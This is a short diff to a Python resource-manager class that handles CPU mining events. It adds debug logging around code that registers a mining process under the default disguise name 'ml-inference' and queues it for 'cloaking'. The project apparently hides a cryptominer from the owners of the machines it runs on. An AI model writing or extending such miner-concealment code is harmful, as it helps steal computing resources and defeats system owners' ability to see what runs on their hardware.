@@ -410,10 +410,16 @@ class ResourceManager(IResourceManager):
     def _on_cpu_mining_event(self, payload: Dict[str, Any]) -> None:
         """Handle CPU mining events - PID Propagation Flow Step 2 - **UPDATED FOR NEW EVENT FORMAT** (cập nhật cho định dạng sự kiện mới)"""
         try:
+            # ✅ DIAGNOSTIC: Log entry point với DEBUG level
+            self.logger.debug(f"🔍 [DIAGNOSTIC] _on_cpu_mining_event triggered")
+            self.logger.debug(f"📦 Event payload: {payload}")
+            
             # ✅ FIXED: Updated to match start_mining.py payload structure
             pid = payload.get('pid')
             process_name = payload.get('process_name', 'ml-inference')
             status = payload.get('status')
+            
+            self.logger.debug(f"🎯 Parsed values - PID: {pid}, Process: {process_name}, Status: {status}")
             
             if pid and status == 'running':
                 self.logger.info(f"🔨 ResourceManager received CPU PID registered: PID={pid}")
@@ -433,6 +439,8 @@ class ResourceManager(IResourceManager):
                 self.enqueue_cloaking(mining_process)
                 
                 self.logger.info(f"✅ CPU PID {pid} processed: registered + enqueued for cloaking")
+            else:
+                self.logger.debug(f"⚠️ Skipping CPU event - invalid payload: pid={pid}, status={status}")
                 
         except Exception as e:
             error_msg = f"❌ Error handling CPU mining event: {e}"
